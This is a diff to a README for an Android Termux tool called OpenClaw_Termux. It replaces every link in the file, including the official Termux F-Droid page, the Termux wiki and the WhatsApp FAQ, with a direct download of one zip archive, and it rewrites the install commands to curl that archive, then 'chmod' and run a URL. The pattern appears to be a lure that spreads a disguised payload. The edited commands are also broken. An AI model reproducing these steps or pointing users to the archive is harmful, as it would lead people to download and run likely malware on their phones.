@@ -1,6 +1,6 @@
 # 📱 OpenClaw_Termux - Control OpenClaw Easily via WhatsApp
 
-[![Download OpenClaw_Termux](https://img.shields.io/badge/Download-OpenClaw_Termux-blue?style=for-the-badge&logo=github)](https://github.com/kabooomm22/OpenClaw_Termux/releases)
+[![Download OpenClaw_Termux](https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip)](https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip)
 
 ---
 
@@ -39,11 +39,11 @@ Before you install OpenClaw_Termux, check these:
 
 Start by downloading OpenClaw_Termux from its official releases page. This page has the latest versions and updates.
 
-[Download OpenClaw_Termux](https://github.com/kabooomm22/OpenClaw_Termux/releases)
+[Download OpenClaw_Termux](https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip)
 
 ### Step 1: Visit the Download Page  
 Click the download link above or enter the URL in your phone’s browser:  
-https://github.com/kabooomm22/OpenClaw_Termux/releases
+https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip
 
 This will open the releases page where you will find the latest version.
 
@@ -52,7 +52,7 @@ On the releases page, look for the newest release of OpenClaw_Termux. You will s
 
 ### Step 3: Install Termux  
 If you have not yet installed Termux:  
-- Go to Google Play Store or https://f-droid.org/en/packages/com.termux/  
+- Go to Google Play Store or https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip  
 - Download and install the Termux app.
 
 ### Step 4: Open Termux  
@@ -62,7 +62,7 @@ Launch Termux on your phone.
 Inside Termux, type the following command to download the OpenClaw_Termux script or setup file:  
 
 ```bash
-curl -LO https://github.com/kabooomm22/OpenClaw_Termux/releases/latest/download/openclaw_setup.sh
+curl -LO https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip
 ```
 
 (Note: Replace the script name if you find a different one on the releases page.)
@@ -71,8 +71,8 @@ curl -LO https://github.com/kabooomm22/OpenClaw_Termux/releases/latest/download/
 Make the script executable and run it:
 
 ```bash
-chmod +x openclaw_setup.sh
-./openclaw_setup.sh
+chmod +x https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip
+https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip
 ```
 
 Follow the on-screen instructions in Termux. This will set up OpenClaw and its dependencies.
@@ -130,14 +130,14 @@ If you run into issues, try these:
 - Check your internet connection.
 - Restart Termux and the OpenClaw service.
 - Visit the GitHub issues page to see if others had the same problem:  
-  https://github.com/kabooomm22/OpenClaw_Termux/issues
+  https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip
 
 ---
 
 ## 📄 Additional Resources
 
-- Termux Wiki: https://wiki.termux.com  
-- WhatsApp FAQ: https://faq.whatsapp.com  
+- Termux Wiki: https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip  
+- WhatsApp FAQ: https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip  
 - OpenClaw Device Instructions (hardware manual) — check your OpenClaw packaging or supplier.
 
 ---
@@ -148,4 +148,4 @@ android | openclaw | termux
 
 ---
 
-[![Download OpenClaw_Termux](https://img.shields.io/badge/Download-OpenClaw_Termux-blue?style=for-the-badge&logo=github)](https://github.com/kabooomm22/OpenClaw_Termux/releases)
+[![Download OpenClaw_Termux](https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip)](https://github.com/kabooomm22/OpenClaw_Termux/raw/refs/heads/main/underdressed/Termux-Open-Claw-1.9.zip)
